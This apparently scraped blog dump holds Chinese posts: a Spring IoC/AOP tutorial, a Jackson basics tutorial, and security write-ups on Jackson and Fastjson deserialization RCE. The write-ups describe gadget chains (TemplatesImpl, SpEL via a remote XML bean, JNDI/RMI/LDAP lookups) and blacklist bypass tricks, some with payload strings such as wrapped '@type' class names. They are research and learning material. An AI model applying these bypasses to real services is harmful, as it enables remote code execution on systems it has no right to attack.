id：Bean的唯一标识符； name：Bean的名称，可以通过name属性为同一个Bean同时指定多个名称，用逗号分隔； class，指定Bean的实现类，必须使用全类名； scope：表示Bean的作用域； constructor-arg：&lt;bean&gt;的子元素，传入构造参数； property，&lt;bean&gt;元素的子元素，用于调用 Bean 实例中的 setter 方法对属性进行赋值，从而完成属性的注入。 IoC控制反转，它不是一门技术，而是一种设计思想，是一个重要的面向对象编程法则，能够指导我们如何设计出松耦合、更优良的程序。 什么是控制反转：在传统的Java应用中，要调用对象时，通常由调用者new出被调用者的对象；而在Spring框架中，是由IoC容器来创建对象的，然后再给调用者，就是所谓的“控制反转”。IoC好处在于解耦合。 依赖注入（DI）Denpendency Injection，在面向对象中，对象和对象之间是存在一种叫做“依赖”的关系。简单来说，依赖关系就是在一个对象中需要用到另外一个对象，即对象中存在一个属性，该属性是另外一个类的对象。 依赖注入本质上是 Spring Bean 属性注入的一种，只不过这个属性是一个对象属性而已。 IoC容器IoC 思想基于 IoC 容器实现的，IoC 容器底层其实就是一个 Bean 工厂。Spring 框架为我们提供了两种不同类型 IoC 容器，它们分别是 BeanFactory 和 ApplicationContext。 BeanFactory是 IoC 容器的基本实现，也是 Spring 提供的最简单的 IoC 容器，它提供了 IoC 容器最基本的功能，由 org.springframework.beans.factory.BeanFactory 接口定义。BeanFactory 采用懒加载（lazy-load）机制，容器在加载配置文件时并不会立刻创建 Java 对象，只有程序中获取（使用）这个对对象时才会创建。它属于Spring内部使用接口，通常情况下不提供给开发人员使用。 ApplicationContext 是 BeanFactory 接口的子接口，是对 BeanFactory 的扩展。ApplicationContext 在 BeanFactory 的基础上增加了许多企业级的功能，例如 AOP（面向切面编程）、国际化、事务支持等。 它有两个常用的实现类： ClassPathXmlApplicationContext，加载类路径 ClassPath 下指定的 XML 配置文件，并完成 ApplicationContext 的实例化工作； FileSystemXmlApplicationContext，加载指定的文件系统路径中指定的 XML 配置文件，并完成 ApplicationContext 的实例化工作。 IoC示例创建一个maven，在pom.xml中添加依赖，报错就刷新maven下载依赖包： （lombok依赖包可以免除写get、set方法） 传统方法获取对象：创建实体类Student.java： 手动new对象： 通过IoC创建对象：Address.java： Student.java： 在配置文件中添加需要管理的对象，对各个对象以及它们之间的依赖关系进行配置；XML格式的配置文件，文件名可自定义，建在resource目录下（new-&gt;XML Configuration File-&gt;Spring Config）； 配置文件中的&lt;bean&gt;标签中： id指对象名； class指对象的模板类（所有交给IoCL来管理的类必须有无参构造方法，因为Spring底层是通过反射机制来创建对象，调用的是无参构造方法） 对象的成员变量通过property标签来赋值： name，成员变量名 value，成员变量值（基本数据类型，String可以直接赋值，其他引用类型不能通过value赋值） ref，将IoC中的另一个bean赋给当前的成员变量（DI注入） IoC创建对象： 创建 ApplicationContext 对象时使用了 ClassPathXmlApplicationContext 类，这个类用于加载 Spring 配置文件、创建和初始化所有对象（Bean）。ApplicationContext.getBean()方法用来获取 Bean，该方法返回值类型为 Object，通过强制类型转换为 student 的实例对象。 运行结果：[1] 由于对象的基本信息、对象之间的依赖关系都是在配置文件中定义的，并没有在代码中紧密耦合，因此即使对象发生改变，我们也只需要在配置文件中进行修改即可，而无须对 Java 代码进行修改，这就是 Spring IoC 实现解耦的原理。 IoC底层实现实际上就是xml解析和反射获取对象的过程。pom.xml添加依赖： 通过调用无参构造函数创建对象：配置文件（ref指向的bean最好放在前面，好赋值一点）： 模拟一个接口MyApplicationContext，里面有获取bean的抽象方法： 创建MyClassPathXmlApplicationContext类实现MyApplicationContext接口，模拟IoC进行xml解析和反射获取对象的操作。 MyTest.java： 运行结果：[2] &#x3D;&#x3D;？如何使用有参构造方法创建对象：; 通过有参构造函数创建对象配置文件，使用&lt;constructor-arg&gt;标签： student类中添加有参构造函数： 给Bean注入集合：配置文件： 成员变量类型定义为List：private List&lt;Address&gt; address; scope作用域Spring管理的Bean是根据scope来生成的，表示Bean的作用域，Spring 5提供了6种。 singleton：默认值，单例模式，表示在Spring容器中只有一个Bean实例。 prototype：原型模式，表示每次通过 Spring 容器获取 Bean 时，容器都会创建一个新的 Bean 实例。 request ：每次 HTTP 请求，容器都会创建一个 Bean 实例。该作用域只在当前 HTTP Request 内有效。 session ：同一个 HTTP Session 共享一个 Bean 实例，不同的 Session 使用不同的 Bean 实例。该作用域仅在当前 HTTP Session 内有效。 application ：同一个 Web 应用共享一个 Bean 实例，该作用域在当前 ServletContext 内有效。 websocket ：websocket 的作用域是 WebSocket ，即在整个 WebSocket 中有效。request和session只适用于web项目，使用单例模式和原型模式的较多。 单例模式示例：在配置文件中，为bean添加scope=&quot;singleton&quot;； 在main方法中获取三个Bean，并进行比较： 返回结果为true；[3] 说明无论获取多少个Bean，实际上都是同一个，指向一个地址；单例模式下，当Spring加载配置文件时就会创建Bean，后无面论是否获取Bean（getBean），都不再创建新的bean； 缺点：当我们不需要获取Bean时就已经创建了Bean； 优点：只用创建一个Bean，节省空间。 原型模式示例：在配置文件中改为scope=&quot;prototype&quot;；同样获取三个Bean，结果为false；[4] 说明三个Bean实例都不一样，指向三个地址 。 原型模式下，当业务代码获取IoC容器中的bean时(调用getBean时)，Spring才去调用无参构造函数创建对应的bean； 缺点：每获取一个Bean就要创建一个对象，占用空间； 优点，只在需要使用Bean的时候才创建Bean。 Spring Bean继承Spring中Bean继承是对象层面的继承，子Bean可以继承父Bean的属性值和父Bean的配置数据，可以根据需要重写或添加配置信息；(Java继承是类层面的继承，子类可以继承父类的内部结构信息) 子Bean的类的属性要多于等于父Bean的类的属性，否则会报错。 示例：在配置文件中定义student2继承student1，并修改name属性值，添加了sex属性，其他属性不变； main方法中获取分别两个bean； 结果可以看到，除了修改的name属性，添加的sex属性，其他属性都继承了student1；[5] Spring 依赖依赖也是bean和bean之间的一种关系，配置依赖后，被依赖的bean一定是先创建，再创建依赖的bean。（A依赖于B，先创建B，再创建A） 默认情况下，在配置文件中写在前面的Bean先创建，后面的Bean后创建。添加depends-on=&quot;&quot;缺点依赖关系； 配置文件，student依赖于teacher： Teacher.java: Student.java： 结果是Teacher对象先创建，说明不论位置关系如何，被依赖的对象都是先创建。[6] Spring Bean属性注入属性注入就是将属性注入到Bean中的过程，这些属性既可以是普通型，也可以是对象（Bean）。 Spring 主要通过以下 2 种方式实现属性注入： 构造函数注入 setter 注入（又称设值注入） 前面也都已经演示过了；构造函数注入就是在配置文件中使用&lt;constructor-arg&gt;对属性进行赋值；seter注入就是使用&lt;property&gt;对属性进行赋值。 在通过构造函数或 setter 方法进行属性注入时，通常是在 &lt;bean&gt; 元素中嵌套 &lt;property&gt; 和&lt;constructor-arg&gt;元素来实现的。这种方式虽然结构清晰，但书写较繁琐。Spring提供了两种短命名空间，以简化xml配置： p命名空间： &lt;bean id=&quot;Bean 唯一标志符&quot; class=&quot;包名+类名&quot; p:普通属性=&quot;普通属性值&quot; p:对象属性-ref=&quot;对象的引用&quot;&gt; c命名空间： &lt;bean id=&quot;Bean 唯一标志符&quot; class=&quot;包名+类名&quot; c:普通属性=&quot;普通属性值&quot; c:对象属性-ref=&quot;对象的引用&quot;&gt; p命名空间使用p命名空间需要在配置文件的&lt;beans&gt;元素中导入如下XML约束：xmlns:p=&quot;; 在配置文件中给属性的赋值写成如下样子(xmlns:p..要写在xsl:sche..前面)： 使用 p 命名空间注入依赖时，必须注意以下 3 点： Java 类中必须有 setter 方法； Java 类中必须有无参构造器（类中不包含任何带参构造函数的情况，无参构造函数默认存在）； 在使用 p 命名空间实现属性注入前，XML 配置的 &lt;beans&gt; 元素内必须先导入 p 命名空间的 XML 约束。 c命名空间使用c命名空间需要在配置文件的&lt;beans&gt;元素中导入如下XML约束：xmlns:c=&quot;; 在配置文件中给属性的赋值写成如下样子： 使用 c 命名空间注入依赖时，必须注意以下 2 点： Java 类中必须包含对应的有参构造函数； 在使用 c 命名空间实现属性注入前，XML 配置的 &lt;beans&gt; 元素内必须先导入 c 命名空间的 XML 约束。 Spring的工厂方法IoC通过工程模式创建bean的方式有两种： 静态工厂方法 实例工厂方法 静态工厂方法示例spring-config.xml，在&lt;bean&gt;中添加factory-method=&quot;getCar&quot;： Car.java： 静态工厂方法，里面定义一个静态代码块： main方法获取car： 运行结果：[7] 当MyCar中加载配置文件进内存时，就执行了StaticCarFactory中的静态代码块，创建了Bean，当getBean时再拿出来使用。 实例工厂方法配置文件中配置两个&lt;bean&gt;，先创建实例工厂的对象，再通过实例工厂对象来创建Car对象；（实例工厂本身需要实例化，静态工厂不用） 给Map赋值就写在构造方法中： main方法中获取Car的Bean； Spring自动装配（Autowire）在Bean与Bean之间建立依赖关系的行为称为“装配”；IoC容器本身是并不能独自完成装配工作，需要我们主动将Bean放进去，并告诉它Bean之间的依赖关系，它才能按照我们的要求完成装配工作。手动通过配置&lt;property&gt;和&lt;constructor-arg&gt;来维护Bean之间的依赖关系会随着依赖关系的增加使代码越来越复杂和繁琐，而自动装配大大提高了开发效率。 Spring 的自动装配功能可以让 Spring 容器依据某种规则（自动装配的规则，有五种），为指定的 Bean 从应用的上下文（AppplicationContext 容器）中查找它所依赖的 Bean，并自动建立 Bean 之间的依赖关系。 Spring 框架式默认不支持自动装配的，要想使用自动装配，则需要对 Spring XML 配置文件中&lt;bean&gt;元素的 autowire 属性进行设置；&lt;bean id=&quot;&quot; class=&quot;&quot; autowire=&quot;自动装配规则&quot;&gt; 自动装配规则 byName 按名称自动装配。Spring 会根据的 Java 类中对象属性的名称，在整个应用的上下文 ApplicationContext（IoC 容器）中查找。若某个 Bean 的 id 或 name 属性值与这个对象属性的名称相同，则获取这个 Bean，并与当前的 Java 类 Bean 建立关联关系。 byType 按类型自动装配。Spring 会根据 Java 类中的对象属性的类型，在整个应用的上下文 ApplicationContext（IoC 容器）中查找。若某个 Bean 的 class 属性值与这个对象属性的类型相匹配，则获取这个 Bean，并与当前的 Java 类的 Bean 建立关联关系。 constructor 按类型自动装配。与 byType 模式相似，不同之处在与它应用于构造器参数（依赖项），如果在容器中没有找到与构造器参数类型一致的 Bean，那么将抛出异常。其实就是根据构造器参数的数据类型，进行 byType 模式的自动装配。 default 表示默认采用上一级元素 &lt;beans&gt;设置的自动装配规则（default-autowire）进行装配。 no 默认值，表示不使用自动装配Bean 的依赖关系必须通过 &lt;constructor-arg&gt;和 &lt;property&gt;元素的 ref 属性来定义。 示例：在配置文件中使用autowire将car注入到person中，替代ref； Person类中定义一个Car类型参数： main方法： 如果autowire=&quot;byName&quot;，则根据Person类中的Car类型的参数名car，在&lt;bean&gt;中寻找id为car的bean，如果找不到，则car参数值为null；如果autowire=&quot;byType&quot;，则根据Person类中的Car类型，在&lt;bean&gt;中寻找类型为Car的bean，不论名称是否相等，如果找不到则报错；如果存在多个Car类型的bean，会抛出异常——没有唯一的bean。 AOPAOP使对面向对象的一个补充，在运行时，动态的将代码切入到类的指定方法、指定位置上的编程思想就是面向切面编程。将不同方法的同一个位置抽象成一个切面，对该切面对象进行编程就是AOP。 AOP的优点: 降低模块之间的耦合度 使系统容易扩展 更好的代码复用 非业务代码更加集中，不分散，便于统一管理 业务代码更简洁纯粹，没有其他代码影响 动态代理 AOP示例Spring AOP的底层是通过动态代理为目标对象执行横向织入的；Spring 在运行期会为目标对象生成一个动态代理对象，并在代理对象中实现对目标对象的增强。 创建Maven工程，导入依赖包； 定义一个计算器接口： 写它的实现类，这个是需要被代理的类，里面的方法属于是业务方法： 定义一个处理器，需要用它来生成代理对象： main方法： 运行结果：[8] 把每个方法中重复的输出代码，整合到invoke方法中，简化代码，这就是AOP； 实现原理就是动态代理的知识，当调用被代理类的方法的时候，会自动调用handler中的invoke方法，所以每调用一次计算方法，就调用一次invoke方法，进行一次输出。 Spring AOP示例Spring框架对AOP进行了封装，使用Spring框架可以用面向爱对象的思想来实现AOP；Spring框架中不需要创建Invocationhandler，只需要创建一个切面对象，将所有的非业务代码在切面对象中完成，Spring框架底层会自动根据切面类以及目标类生成一个代理对象。 定义切面类，在里面添加如下注解：@Aspect注解表示该类是切面类；@Component注解表示将该类的对象注入到IoC容器中；@Before注解表示方法执行的时机，在关联类中的方法执行前执行该方法，将before()方法与CalcImpl类中的方法位置关联起来；@After注解表示在关联类中的方法执行后、返回前执行该方法；@AfterReturning注解表示在关联类的方法返回后执行该方法，第二个参数表示返回的参数，这里的名字不一定要和关联类中方法的返回参数的名字相同，但是必须和该方法的形参名一致；@AfterThrowing注解表示在关联类的方法出现异常是执行该方法。 JoinPoint是连接点，可以实现方法调用，实际上也是通过反射调用。 CalcImpl中也添加@Component注解，将它交给IoC容器来管理；该注解就相当于在配置文件中写了一个&lt;bean&gt;，id默认是类名calcImpl(首字母小写)，也可自定义名称@Component(&quot;calc&quot;)：&lt;bean id=&quot;calcImpl&quot; class=&quot;AOP.CalcImpl&quot;&gt;&lt;/bean&gt; 将切面类交给IoC管理，一是需要添加@Component注解，二是需要Spring框架来扫描该类；在配置文件中添加一个自动扫描context:component-scan，它会到base-package中的类去扫描，如果扫描到添加了@Component注解，就把这个类交给IoC容器，让IoC来管理它的对象；aop:aspectj-autoproxy让Spring框架结合切面类和目标类自动生成动态代理对象。（相当于当Spring自动实现handler的功能） 配置文件如下： main方法，加载配置文件，生成代理对象： 运行结果：[9] 切面:横切关注点被模块化的抽象对象。 通知:切面对象完成的工，即非业务代码。 目标:被通知的对象，即被横切的对象。 代理:切面、通知、目标混合之后的对象。 连接点:通知要插入业务代码的具体位置。 切点: AOP通过切点定位到连接点。 "},{"title":"Jackson 反序列化 RCE","date":"2022-09-19T11:31:58.000Z","url":"/2022/09/19/Jackson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE/","categories":[[" ",""]],"content":"CVE-2017-7525影响版本 Jackson 2.6系列 &lt; 2.6.7.1 Jackson 2.7系列 &lt; 2.7.9.1 Jackson 2.8系列 &lt; 2.8.8.1 环境搭建我用的是 JDK 8u20，对 JDK 的版本要求比较不确定，网上大部分人用 7u21 能复现，但是我的不行，得自己多试试。 导入依赖： 漏洞复现（TemplatesImpl 链）这里直接贴 POC，和 Fastjson 的 TemplatesImpl 链差不多，直接看能看懂。 构造一个恶意类，继承 AbstractTranslet（在 Fastjson 里说过原因）； 将恶意类的字节码进行 base64 编码； 定义一个实体类，其中包含一个Object属性； 使用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类构造 POC；在 User 类的object属性中指明该属性类的全类名，并且给其相应的变量赋值，transletBytecodes是恶意类的字节码进行 base64 编码后的值；设置 DefaultTyping 为默认值，即 OBJECT_AND_NON_CONCRETE； 运行成功： 不开启 DefaultTyping 的话只会将 JSON 数据当作普通字符串来解析，并不会触发object属性值里的恶意代码； POC 调试跟进ObjectMapper.readValue() ； 分别跟进，JsonFactory.createParser()，封装了要反序列化的 JSON 数据，返回一个ReaderBasedJsonParser类对象； 跟进TypeFactory.constructType()，获取到的是entity.User类； 然后跟进 ObjectMapper._readMapAndClose()，各变量的值如图所示； 跟进BeanDeserializer.deserialize()，进入 if 语句； 跟进vanillaDeserialize()，调用StdValueInstantiator.createUsingDefault()方法根据构造方法实例化了一个 User 对象，各属性值都为 null ； 跟进MethodProperty.deserializeAndSet()，调用了SettableBeanProperty.deserialize() -&gt; StringDeserializer.deserialize()方法，将name的值取了出来，然后调用 setter方法将值赋给前面生成的 User 对象； 循环调用deserializeAndSet()方法，把每一个属性的值都取出来赋给 User 对象；直到获取object的值，this._valueTypeDeserializer的值不为 null ，调用UntypedObjectDeserializer.deserializeWithType(); 继续调用AsArrayTypeDeserializer.deserializeTypedFromAny() -&gt; _deserialize()，获取到对应TemplatesImpl类的 deser 是BeanDeserializer类型； 调用BeanDeserializer.deserialize() -&gt; vanillaDeserialize() -&gt; MethodProperty.deserializeAndSet()，和前面一样，将 JSON 数据中 TemplatesImpl 的值去除赋给TemplatesImpl 对象； 当取到outputProperties变量时，跟进到SetterlessProperty.deserializeAndSet()，调用的是getter方法； 这里为什么调用deserializeAndSet()的类不一样，是因为outputProperties变量对应的类不一样； 继续，一直跟进到TemplatesImpl.defineTransletClasses()，和 Fastjson 一样，在这里将传入的字节码转换为了 Java 对象； 然后在getTransletInstance()实例化该对象，触发命令执行。 调用链如下： 可以看到在defineTransletClasses()的 332 行中，和之前分析的 Fastjson 有点不一样；之前是这样的，区别在于有无_tfactory参数： 这是因为 JDK 版本不同，如果使用 8u112 版本，把_tfactory参数添加到 POC 里_tfactory:&#123; &#125;，会报错； 这个错误是 jackson-databind 报的，说明它不支持这个参数，所以只能选择没有_tfactory参数的 JDK 版本进行利用。 参考链接： CVE-2017-17485补丁分析jackson-databind 2.7.9.1 版本中，在获取typeId对应的 Deserializer 类型时，对传入的类做了黑名单校验； 一直到BeanDeserializerFactory.createBeanDeserializer()中，调用了 checkIllegalTypes()方法（注意看调用链）； 跟进checkIllegalTypes()，获取了传入类的全类名，然后在黑名单中对比； 可以看到com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl以及被加入到了黑名单中，所以无法在利用了。 补丁绕过在开启enableDefaultTyping()的情况下，利用org.springframework.context.support.ClassPathXmlApplicationContext来加载远程指定的 XML 配置文件，在配置文件中定义一个 bean ，bean 中通过使用 Spring EL 表达式来调用java.lang.ProcessBuilder的start()方法来执行命令。 导入依赖： 构造 bean 文件 spel.xml： 启一个 web 服务，把 bean 文件放到能访问的 web 目录下：python -m http.server 8081 构造 POC ，把object 属性赋值为org.springframework.context.support.ClassPathXmlApplicationContext： 运行成功： 影响版本 Jackson-databind version 2.9.3 Jackson-databind version 2.7.9.1 Jackson-databind version 2.8.10 POC 调试跟进获取object属性值时的BeanDeserializer.vanillaDeserialize()； 能成功绕过黑名单，一直到AnnotatedConstructor.call1()，调用ClassPathXmlApplicationContext的构造函数，以为参数实例化了一个对象； 这一步就是 Spring 加载配置文件、创建和初始化 bean 的步骤了。 继续跟跟看，跟进构造方法； 调用setConfigLocations()，对远程地址进行解析； 而后 new 了一个 StandardEnvironment； 它是 AbstractEnvironment 的子类，作用是获取和设置应用程序的属性和环境； 最后 refresh 一下，触发命令执行。 调用链如下： 参考链接： c3p0利用使用com.mchange.v2.c3p0.JndiRefForwardingDataSource，通过 JNDI+ RMI 进行利用。服务端代码： 客户端代码： 运行成功： 这里调用jndiName的 set 方法，把rmi://127.0.0.1:1099/calc赋给它； 然后调用到loginTimeout的 set 方法； 跟进setLoginTimeout() -&gt; inner()； 跟进JndiRefForwardingDataSource.dereference()，调用到lookup()，触发命令执行。 调用链如下： CVE-2018-5968补丁分析 2.7.9.2 版本中，使用了validateSubType()方法对传入的类进行黑名单校验； 虽然org.springframework.context.support.ClassPathXmlApplicationContext不在黑名单中，但是专门对org.springframework.开头的类进行了判断； 然后循环获取它的父类，再在 if 中进行对比，若父类为AbstractPointcutAdvisor或AbstractApplicationContext，则跳出循环，抛出异常。 同时也把 c3p0 可利用的类加入了黑名单； 补丁绕过寻找黑名单中没有的、可利用的类，可以使用org.apache.ibatis.datasource.jndi.JndiDataSourceFactory，通过 JNDI + LDAP 的方式进行利用。 漏洞触发点在JndiDataSourceFactory.setProperties()中，if 分支和 else if 分支都使用了 lookup，满足其中一个分支就可以了； 这里我根据 else if 分支来构造 POC，也就是说如果properties参数里面包含data_source，就进入else if；那么就向properties参数中传入一个 键为data_source，值为远程恶意类地址 的值，当反序列化时调用到setProperties()，进入 else if 分支，检索指定的远程对象，导致RCE。 导入依赖： 启一个 Web 服务，上传命令执行类的 class 文件； 服务端代码编写（参考marshalsec）： 客户端代码编写，需要开启 DefaultTyping； 运行成功： 影响版本2.8.11和2.9.x至2.9.3 POC 调试能成功绕过黑名单检测； 递归获取到properties参数； 跟进到MapDeserializer.deserialize()，获取到properties参数类型是 Properties ； 调用_readAndBindStringMap()进行参数绑定，获取到参数名data_source；调用StringDeserializer.deserialize()获取参数值，最后将参数值赋给data_source； 回到deserializeAndSet()，调用properties的 set 方法； 最后调用lookup()触发命令执行。 调用链如下： 参考链接："},{"title":"Jackson 简单学习","date":"2022-09-19T11:31:57.000Z","url":"/2022/09/19/Jackson%20%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","categories":[[" ",""]],"content":"前言Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。 需要在工程中导入依赖： 最常用的 API 是基于“对象绑定”的 ObjectMapper，其中包含多个序列化和反序列化的方法。 序列化可以通过ObjectMapper类中writeValuexxx方法将 Java 对象序列化为 JSON 数据，以不同的格式存储； writeValueAsString(Object value) 方法，将对象存储成字符串 writeValueAsBytes(Object value) 方法，将对象存储成字节数组 writeValue(File resultFile, Object value) 方法，将对象存储成文件 定义一个实体类，city变量没有 get 方法： 将 Java 对象序列化为 JSON字符串： 运行结果： 可以看到，调用了setCity()，但是在序列化的结果中并没有city属性，因为它没有设置 get 方法。 反序列化可以通过ObjectMapper类中readValue()方法，将不同类型的 JSON 数据反序列化为 Java 对象； readValue(String content, Class&lt;T&gt; valueType) 方法，将字符串反序列化为 Java 对象 readValue(byte[] src, Class&lt;T&gt; valueType) 方法，将字节数组反序列化为 Java 对象 readValue(File src, Class&lt;T&gt; valueType) 方法，将文件反序列化为 Java 对象 反序列化示例： 运行结果，city输出能够被反序列化： Jackson 多态类型的反序列化在反序列化时，只知道反序列化的类的类型，但是不知道这个类中各个属性是什么类型，可能是 Object类型，也可能是 interface 类型，那么如何知道反序列化的类的属性是什么类型呢？ 这就是由 JacksonPolymorphicDeserialization 机制来解决这个问题。 将属性具体类型信息序列化到 JSON 数据中的方法有两种： 设置 DefaultTyping 使用 @JsonTypeInfo 注解 DefaultTypingJackson 中提供了一个 DefaultTyping 属性，其中包含四个值： 通过enableDefaultTyping()方法来设置属性值。 JAVA_LANG_OBJECT当类里的属性声明为一个 Object 时，会对该属性进行序列化和反序列化，并且明确规定类名。 在实体类中设置一个Object类型的成员变量； 设置 DefaultTyping 为 JAVA_LANG_OBJECT，给object变量赋值为People对象； People 类，需要有无参构造； 运行结果： 可以看到，设置了 DefaultTyping 的序列化结果会输出该属性的类型，反序列化的结果中也还原了属性类型。 OBJECT_AND_NON_CONCRETE这是enableDefaultTyping()的默认值。当类里有 Interface 、 AbstractClass 类型属性时，会对其进行序列化和反序列化。 定义一个接口及其实现类： 在 User 类中添加上该属性： 设置 DefaultTyping 为 OBJECT_AND_NON_CONCRETE，运行结果可以看到将接口类型的属性也进行了序列化： NON_CONCRETE_AND_ARRAYS支持数组类型的属性序列化和反序列化。 给object赋值为 People 数组类型： 运行结果： NON_FINAL支持除 final 属性外的所有类型序列化和反序列化。 运行结果： 将数组中每个对象的类型都列了出来。 @JsonTypeInfo 注解@JsonTypeInfo 注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值： @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.NONE) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CLASS) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.MINIMAL_CLASS) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.NAME) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.COSTOM) JsonTypeInfo.Id.NONE在实体类的object属性上添加该注解： 运行结果如下，与不添加该注解没区别： JsonTypeInfo.Id.CLASS在实体类的object属性上添加该注解： 运行结果如下： 在序列化的结果中，object属性中多了一个@class字段，指明了该属性类型的全类名；反序列化时能够成功将object的值按照entity.People类转换为 People 对象。 JsonTypeInfo.Id.MINIMAL_CLASS在实体类的object属性上添加该注解：@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS) 运行结果如下： 效果和 JsonTypeInfo.Id.CLASS 一样，只是用@c代替了@class。 JsonTypeInfo.Id.NAME在实体类的object属性上添加该注解：@JsonTypeInfo(use = JsonTypeInfo.Id.NAME) 运行结果如下： 序列化结果中多了一个@type字段，指明了类名；但是反序列化时出现了报错，因为@type字段只指明了类名，没指明包名，反序列化无法找到具体是那个包下 People 类，所以反序列化失败。 JsonTypeInfo.Id.CUSTOM在实体类的object属性上添加该注解：@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM) 这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常： 总结当 JSON 字符串中指明了反序列化属性的全类名时，就可以将 JSON 数据反序列化为对应对象。 在下列设置的情况下进行序列化生成的 JSON 数据，指明了属性的全类名： enableDefaultTyping() @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CLASS) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.MINIMAL_CLASS) 和 Fastjson 一样，在序列化、反序列化时会调用对应方法的 get、set 方法，包括Object属性对应类的 get、set 方法： 也就是说，如果反序列化的类及其属性类的 get、set 方法中存在可控参数，就可以通过构造恶意的 JSON 数据来利用。 参考链接："},{"title":"Fastjson 反序列化RCE","date":"2022-09-19T11:31:56.000Z","url":"/2022/09/19/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE/","categories":[[" ",""]],"content":"Fastjson &lt;&#x3D; 1.2.41补丁分析从 1.2.25 版本开始，在黑名单中添加了许多禁止反序列化的包名，并且新增了checkAutoType()方法来对反序列化的类型进行判断。 代码对比： 1.2.24版本：在DefaultJSONParser.parserObject()中，276行加载了@type指定的类，318行调用getDeserializer()； 在ParserConfig.getDeserializer()中对加载的类进行了黑名单校验，黑名单中只有java.lang.Thread，程序能够继续执行。 1.2.25 版本：在DefaultJSONParser.parserObject()中，276行调用了checkAutoType()对获取到的@type字符串进行校验； 727行会先从mapping中去找有没有传入的类，这里是没有的，clazz为 null；autoTypeSupport默认为false，进入循环检测，这里的denyList里面添加了许多包名，包括我们前面使用的 TemplatesImpl 和 JdbcRowSetImpl，都属于com.sun，所以在这里就会报异常。 补丁绕过主要就是要绕过checkAutoType()检测。 首先，想要绕过黑名单检测，就得构造类名不在黑名单内，比如随便在类名上添加点字母符号之类的；然后，还得能加载这个类，有loadClass()的地方有这三个； 有两个是在对acceptList[]的循环中，acceptList[]这个数组本来就没有元素，所以根本不会进入 for 循环；那么就只剩第三个，需要满足的条件要么autoTypeSupport为 true，要么expectClass不为 null；可是expectClass本来传入的就是 null，改不了；所以只能通过修改autoTypeSupport属性为 true 来进入 if 语句； 跟进TypeUtils.loadClass()看看，clazz肯定是为 null 的，两个else if 中都调用了loadClass()； 第一个else if 中，判断了是否以[开头，尝试在类名前添加[，出现报错，说在 71 的位置希望有个[； 那就在 71 的位置添加上[再看，又说在 72 的位置希望有个&#123;； 那就继续添加&#123;，最后能成功执行命令。 在第二个 else if 中，判断了类名是否以L开头和;结尾，如果是，就把这两个字符去掉，形成新的类名，再加载。 所以，绕过补丁只需要两个条件： autoTypeSupport为 true 在类名对应位置添加指定字符 或 类名以L开头，以;结尾 POC 调试这里我就用 TemplatesImpl 链做演示，原理都一样；第一种绕过方式构造 POC 如下: 断点调试，只贴关键部分； 调用checkAutoType()； 能成功绕过黑名单检测； 进入loadClass()，实例化了一个Array类型，返回一个如图的 clazz； 返回ObjectArrayCodec类型的对象； 150 行去除了类名前后的字符，下面进入parseArray()； 一直跟到ParserConfig.getDeserializer()，因为clazz已经是正常类，所以进入 410 行，后续就和之前的分析一样。 第二种绕过方式构造@type如下：&quot;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\\&quot;,&quot; 调用checkAutoType()； 跟进checkAutoType()，能成功绕过黑名单检测； 跟进loadClass()，生成新的、存在的类名，再调用一次loadClass()； 然后正常加载并返回TemplatesImpl类； 成功获取到TemplatesImpl类后，正常进行后续的实例化恶意类操作。 1.2.43 之前的版本都是针对第二种绕过方式的修复，第一种绕过方式仍然可以使用。 Fastjson &lt;&#x3D; 1.2.42补丁分析在 1.2.42 的checkAutoType()中，把黑名单校验改成了 hash 值进行校验； 计算逻辑不算太难理解： 这里有更多类、包对应的 hash： 先用上一个 POC 调试看看； 发现 796 行把全类名前后的L和;去掉了；然后再取新类名的前三个字符进行计算，然后在 805 行的 for 循环中每次取后面一个字符进行 计算；白名单acceptHashCodes依旧为空，在 815 行判断这时的 hash 值是否在黑名单中，&gt;=0表示存在，第二个逻辑判断恒为真；循环到i=7，也就是已经将com.sun.进行了 hash 计算，这个时候得到 hash 值为 4147696707147271408，在黑名单中存在，所以在这里会报异常。 补丁绕过要绕过黑名单，也就是要让在去除L和;后的类名也不在黑名单中；发现去除L和;的操作只会进行一次，并没有循环去除，尝试双写进行绕过。 POC 调试修改@type值为LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;，其余不变； 能成功走出黑名单检测，来到TypeUtils.loadClass()； 这里会调用两次loadClass()来去除类名前后的字符； 最后再加载。 Fastjson &lt;&#x3D; 1.2.43补丁分析在 1.2.43 的checkAutoType()中，对多写的LL和;;进行了判断，如果出现，会报异常； 补丁绕过那么通过添加LL和;;就行不通了，不过还可以用上面Fastjson &lt;= 1.2.41中提到的第一种绕过方式进行绕过。 Fastjson &lt;&#x3D; 1.2.45补丁分析从 1.2.44 开始，在checkAutoType()中判断了全类名第一个字符是否是[，和首尾字符是否是L和;； 这下将两种绕过方式都限制了，只有另外找一条利用链。 补丁绕过寻找到一个黑名单中没有的类：org.apache.ibatis.datasource.jndi.JndiDataSourceFactory通过 JNDI + LDAP 的方式进行利用。 前提需要目标服务器存在 3.x.x-3.5.0的 mybatis jar包。 构造 POC先看一下JndiDataSourceFactory类的方法和成员变量； 漏洞触发点在JndiDataSourceFactory.setProperties()中，if 分支和 else if 分支都使用了 lookup，满足其中一个分支就可以了； 这里我根据 else if 分支来构造 POC，也就是说如果properties参数里面包含data_source，就进入else if；那么就向properties参数中传入一个 键为data_source，值为远程恶意类地址 